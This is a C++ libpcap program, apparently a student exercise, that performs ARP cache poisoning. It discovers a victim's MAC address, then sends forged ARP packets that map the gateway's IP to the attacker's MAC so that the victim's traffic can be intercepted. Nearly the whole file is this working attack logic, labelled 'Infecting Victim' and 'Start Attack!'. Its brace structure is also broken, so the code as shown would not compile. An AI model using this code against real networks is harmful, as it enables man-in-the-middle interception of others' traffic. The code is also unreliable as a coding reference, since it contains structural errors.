#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <netinet/ether.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <string>
#include <iostream>
#include "libnet1.h"
#include <netinet/ip.h>
#include <stdint.h>
using namespace std;
#pragma pack(push, 1)
struct EthArpPacket final {
   EthHdr eth_;
   ArpHdr arp_;
};
#pragma pack(pop)

char* get_mac_address();
char* victim_address(char* interface);
void usage() {
   printf("syntax: arp-test <interface> <victim ip> <gateway ip>\n");
   printf("sample: send-arp-test wlan0\n");
}

int main(int argc, char* argv[]) {
   if (argc != 4) {
      usage();
      return -1;
   }

   char* dev = argv[1];   //<interface>
   char* victim_ip = argv[2];   //<victim ip>
   char* gateway_ip = argv[3];   //<gateway ip>


   char errbuf[PCAP_ERRBUF_SIZE];
   pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
   if (handle == nullptr) {
      fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
      return -1;
   }


	//to make normal arp request packet address
   EthArpPacket packet;

   char Attacker_Mac[100] = {0,};   //src_mac

   strcpy(Attacker_Mac,get_mac_address());
   printf("Attacker mac : ");
	puts(Attacker_Mac);


   packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF"); // victim MAC
   packet.eth_.smac_ = Mac(Attacker_Mac); // hacker MAC
   packet.eth_.type_ = htons(EthHdr::Arp);

   packet.arp_.hrd_ = htons(ArpHdr::ETHER);
   packet.arp_.pro_ = htons(EthHdr::Ip4);
   packet.arp_.hln_ = Mac::SIZE;
   packet.arp_.pln_ = Ip::SIZE;
   packet.arp_.op_ = htons(ArpHdr::Request);
   packet.arp_.smac_ = Mac(Attacker_Mac);   // hacker MAC
   packet.arp_.sip_ = htonl(Ip(gateway_ip));   // gateway ip
   packet.arp_.tmac_ = Mac("FF:FF:FF:FF:FF:FF");   // victim MAC
   packet.arp_.tip_ = htonl(Ip(victim_ip));   // victim ip


   // const u_char* packet_data;
	char target_mac[20] = {0,};//target_mac
	struct ip* iph;
	struct libnet_ethernet_hdr* mac;

   //EthHdr -> type()
   struct EthHdr *t;


   printf("Infecting Victim\n");

   while(true){
      int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
      if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
     }
      struct pcap_pkthdr* header;

      const u_char* packet_data;//packet_data

      res = pcap_next_ex(handle, &header, &packet_data);

      if (res == 0) continue;

      if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {

         printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));

      }
      
      // printf("ARP test\n");
      t = (EthHdr*)packet_data;      
      // printf("%x\n",t->type_); //packet type 16
      // printf("%d\n",t->type_); //packet type 10
      if(t->type_ == 1544){
         printf("I got arp packet!\n");
         printf("Destination Mac : ");

         mac = (libnet_ethernet_hdr*)packet_data;// packet -> ethernet hdr
         int i;
         char buf[10];
         memset(target_mac,0,20);//memory set
         for(i=0;i<6;i++){
            sprintf(buf,"%02x:",mac->ether_shost[i]);
            strcat(target_mac,buf);
         }
         target_mac[17]='\0';
         puts(target_mac);

         printf("Ip : ");

         iph = (struct ip*)(packet_data+sizeof(struct libnet_ethernet_hdr) + 2);
         printf("%s\n",inet_ntoa(iph->ip_src));
         printf("%s\n",target_mac);
         if(strcmp(inet_ntoa(iph->ip_src),argv[2]) == 0)
         {
            break;
         }

         // break; // broadcast
      }
	   
   }

   printf("I Found victim's mac!\n");
   printf("Start Attack!\n");

   //victim attack
   packet.eth_.dmac_ = Mac(target_mac); // victim MAC
   packet.eth_.smac_ = Mac(Attacker_Mac); // hacker MAC
   packet.eth_.type_ = htons(EthHdr::Arp);

   packet.arp_.hrd_ = htons(ArpHdr::ETHER);
   packet.arp_.pro_ = htons(EthHdr::Ip4);
   packet.arp_.hln_ = Mac::SIZE;
   packet.arp_.pln_ = Ip::SIZE;
   packet.arp_.op_ = htons(ArpHdr::Request);
   packet.arp_.smac_ = Mac(Attacker_Mac);   // hacker MAC
   packet.arp_.sip_ = htonl(Ip(gateway_ip));   // gateway ip
   packet.arp_.tmac_ = Mac(target_mac);   // victim MAC
   packet.arp_.tip_ = htonl(Ip(victim_ip));   // victim ip

   int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
   if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
   }else
      printf("attack success!\n");
   }
   
   int i =0;

   //victim -> attacker 
   while(true){
      struct pcap_pkthdr* header;

      const u_char* packet_data;//packet_data

      res = pcap_next_ex(handle, &header, &packet_data);

      if (res == 0) continue;

      if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {

         printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));

         break;

      }
      
      // printf("ARP test\n");
      t = (EthHdr*)packet_data;      
      // printf("%x\n",t->type_); //packet type 16
      // printf("%d\n",t->type_); //packet type 10

      struct EthArpPacket *p;
      p = (EthArpPacket*)packet_data;
      ip *ip_packet = (ip*)packet_data; 
      if(t->type_ == 1544){
         printf("I got arp packet!\n");
      }else if(t->type_ == 8){//ip4 packet
         printf("I got IP packet!\n");
       }




      }
	   
      i++;
      if(i==10){
         break;
      }
      

   }

   





   pcap_close(handle);
}

char* get_mac_address(){//get attacker mac address
    int socket_fd; 
    int count_if; 
    struct ifreq *t_if_req; 
    struct ifconf t_if_conf; 
    static char arr_mac_addr[17] = {0x00, }; 
    memset(&t_if_conf, 0, sizeof(t_if_conf)); 
    t_if_conf.ifc_ifcu.ifcu_req = NULL; 
    t_if_conf.ifc_len = 0; 
    if( (socket_fd = socket(PF_INET, SOCK_DGRAM, 0)) < 0 ) {
         
    } 
    if( ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0 ) { 
         
    } 
    if( (t_if_req = (ifreq *)malloc(t_if_conf.ifc_len)) == NULL ) {
        close(socket_fd); 
        free(t_if_req); 
    } 
    else { 
        t_if_conf.ifc_ifcu.ifcu_req = t_if_req; 
        if( ioctl(socket_fd, SIOCGIFCONF, &t_if_conf) < 0 ) {
            close(socket_fd); 
            free(t_if_req); 
        } 
        count_if = t_if_conf.ifc_len / sizeof(struct ifreq);
        for( int idx = 0; idx < count_if; idx++ ) { 
            struct ifreq *req = &t_if_req[idx]; 
            if( !strcmp(req->ifr_name, "lo") ) {
                continue; 
            } 
            if( ioctl(socket_fd, SIOCGIFHWADDR, req) < 0 ) { 
                break; 
            } 
            sprintf(arr_mac_addr, "%02x:%02x:%02x:%02x:%02x:%02x", (unsigned char)req->ifr_hwaddr.sa_data[0], (unsigned char)req->ifr_hwaddr.sa_data[1], (unsigned char)req->ifr_hwaddr.sa_data[2], (unsigned char)req->ifr_hwaddr.sa_data[3], (unsigned char)req->ifr_hwaddr.sa_data[4], (unsigned char)req->ifr_hwaddr.sa_data[5]); 
            break;
        } 
    } 
    close(socket_fd); 
    free(t_if_req);

    return arr_mac_addr;
}
